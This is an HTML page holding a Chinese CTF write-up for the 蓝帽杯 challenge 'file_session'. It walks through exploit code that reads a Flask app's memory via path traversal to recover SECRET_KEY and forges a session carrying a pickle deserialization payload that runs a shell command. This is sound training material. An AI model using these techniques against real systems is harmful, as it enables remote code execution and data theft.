@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="蓝帽杯初赛 file_session 见解 大概思路：利用任意文件读取从内存中读取SECRET_KEY值，然后伪造session去打一个pickle反序列化  前言远程环境没有打通，本地docker复现成功。问了一些师傅同样是远程session伪造没有成功，具体原因不明。 本地docker使用的镜像是：python:3.8.0 任意文件读取上来就给了一个&#x2F;download来读取任意文件，我是先尝试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯初赛 file_session 见解">
+<meta property="og:url" content="http://example.com/2022/07/10/File_Session/index.html">
+<meta property="og:site_name" content="一只安服仔">
+<meta property="og:description" content="蓝帽杯初赛 file_session 见解 大概思路：利用任意文件读取从内存中读取SECRET_KEY值，然后伪造session去打一个pickle反序列化  前言远程环境没有打通，本地docker复现成功。问了一些师傅同样是远程session伪造没有成功，具体原因不明。 本地docker使用的镜像是：python:3.8.0 任意文件读取上来就给了一个&#x2F;download来读取任意文件，我是先尝试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710120552744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710121706682.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710122328536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710122522582.png">
+<meta property="article:published_time" content="2022-07-10T04:37:48.476Z">
+<meta property="article:modified_time" content="2022-07-10T04:39:18.369Z">
+<meta property="article:author" content="atao">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710120552744.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>蓝帽杯初赛 file_session 见解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/friend/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/06/05/starCTF2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/10/File_Session/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/10/File_Session/&text=蓝帽杯初赛 file_session 见解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/10/File_Session/&is_video=false&description=蓝帽杯初赛 file_session 见解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蓝帽杯初赛 file_session 见解&body=Check out this article: http://example.com/2022/07/10/File_Session/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/10/File_Session/&name=蓝帽杯初赛 file_session 见解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/10/File_Session/&t=蓝帽杯初赛 file_session 见解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">蓝帽杯初赛 file_session 见解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">pickle反序列化</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        蓝帽杯初赛 file_session 见解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">atao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-10T04:37:48.476Z" itemprop="datePublished">2022-07-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>, <a class="tag-link-link" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+	  
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="蓝帽杯初赛-file-session-见解"><a href="#蓝帽杯初赛-file-session-见解" class="headerlink" title="蓝帽杯初赛 file_session 见解"></a>蓝帽杯初赛 file_session 见解</h2><blockquote>
+<p>大概思路：利用任意文件读取从内存中读取SECRET_KEY值，然后伪造session去打一个pickle反序列化</p>
+</blockquote>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>远程环境没有打通，本地docker复现成功。问了一些师傅同样是远程session伪造没有成功，具体原因不明。</p>
+<p>本地docker使用的镜像是：<code>python:3.8.0</code></p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>上来就给了一个<code>/download</code>来读取任意文件，我是先尝试读取<code>/proc/self/cmdline</code>文件，发现起的是一个flask，然后读取源代码<code>/app/app.py</code>文件，源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> _loads</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># apt install python3.8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;static/image/1.jpg&quot;</span>)</span><br><span class="line">    offset = request.args.get(<span class="string">&#x27;offset&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    length = request.args.get(<span class="string">&#x27;length&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="string">&quot;0&quot;</span> <span class="keyword">and</span> length == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset, length = <span class="built_in">int</span>(offset), <span class="built_in">int</span>(length)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        ret_data = f.read(length)</span><br><span class="line">        <span class="keyword">return</span> ret_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/filelist&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filelist</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/image/&#x27;</span>))&#125;</span> /download?file=static/image/1.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin_pickle_load&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_pickle_load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = _loads(base64.b64decode(session[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    session[<span class="string">&quot;data&quot;</span>] = base64.b64encode(<span class="string">b&quot;error&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;admin pickle&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里在关注到<code>/admin_pickle_load</code>是可以对session进行base64+pickle反序列化的，这里应该就是漏洞利用点，但是需要伪造session。</p>
+<p>这里并没有给SECRET_KEY，我的第一想法是伪造uuid4，虽然说是伪随机，但是没有种子应该没有利用的可能了。后来想到启动flask框架，这些全局变量必定是要存放起来的，那么应该是存放在了内存中。于是就找到了<code>/proc/self/maps</code>和<code>/proc/self/mem</code>文件</p>
+<p>这里建议对这两个文件不了解的读者可以想看看这篇文章：<a target="_blank" rel="noopener" href="https://askdev.io/cn/questions/52854/ru-he-zai-linux-xia-cong-proc-pid-mem-du-qu-shu-ju">https://askdev.io/cn/questions/52854/ru-he-zai-linux-xia-cong-proc-pid-mem-du-qu-shu-ju</a></p>
+<p>但是我用正则死活匹配不到uuid值</p>
+<blockquote>
+<p>接下来的内容就是比赛结束后的了</p>
+</blockquote>
+<p>赛后在水群的时候提出了匹配不到的问题，空白师傅给了我解答让我自己搭环境试试。于是我搭了个环境去测试，是可以找到的。于是我换了一种方式通过匹配与uuid相同位置的关键字作为匹配去找相对应的start和end位置，如下图所示</p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710120552744.png" alt="image-20220710120552744"></p>
+<p>然后写个脚本开始跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url_1 = <span class="string">&quot;http://192.168.68.128:8888/download?file=../../../../../proc/self/maps&quot;</span></span><br><span class="line">res = requests.get(url_1)</span><br><span class="line">maplist = res.text.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maplist:</span><br><span class="line">    m = re.match(<span class="string">r&quot;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> m != <span class="literal">None</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(m.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        url_2 = <span class="string">&quot;http://192.168.68.128:8888/download?file=../../../../../proc/self/mem&amp;offset=&#123;&#125;&amp;length=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            start, end - start)</span><br><span class="line">        res_1 = requests.get(url_2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Blueprint.before_app_request&quot;</span> <span class="keyword">in</span> res_1.text:</span><br><span class="line">            <span class="built_in">print</span> start</span><br><span class="line">            <span class="built_in">print</span> end-start</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里矿大的h0cksr师傅通过正则是有匹配到的(PS:我的正则写的真的拉)，他的方法就是将maps文件中读到的地址都dump下来，然后通过正则去匹配uuid格式，然后提取出来，正则如下</p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710121706682.png" alt="image-20220710121706682"></p>
+<h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>拿到了uuid后就可以开始伪造session的内容了。</p>
+<p>伪造的session远程都打不通，但是本地可以，不知道是不是远程有问题。当然也可能是我自己某一点没想到吧。</p>
+<p><strong>伪造后打远程的情况如下</strong></p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710122328536.png" alt="image-20220710122328536"></p>
+<p>这里返回了<code>session</code>和<code>admin pickle</code>说明我们构造的<code>session[&#39;data&#39;]</code>并没有被靶机读到</p>
+<p><strong>伪造后打本地的情况如下</strong></p>
+<p>伪造的脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput, (<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&quot;f238196a-466d-445b-942c-c1bbfcfdb7db&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    session[<span class="string">&#x27;data&#x27;</span>] = base64.b64encode(pickle.dumps(payload()))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;atao&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里如果出题人没有改pickle.py的源码，利用上面的payload应该是能打通的。</p>
+<p><img src="https://raw.githubusercontent.com/erRORatao/Blog-images/main/images/image-20220710122522582.png" alt="image-20220710122522582"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friend/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">蓝帽杯初赛 file_session 见解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">pickle反序列化</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/10/File_Session/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/10/File_Session/&text=蓝帽杯初赛 file_session 见解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/10/File_Session/&is_video=false&description=蓝帽杯初赛 file_session 见解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蓝帽杯初赛 file_session 见解&body=Check out this article: http://example.com/2022/07/10/File_Session/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/10/File_Session/&title=蓝帽杯初赛 file_session 见解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/10/File_Session/&name=蓝帽杯初赛 file_session 见解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/10/File_Session/&t=蓝帽杯初赛 file_session 见解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    atao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/friend/">友链</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
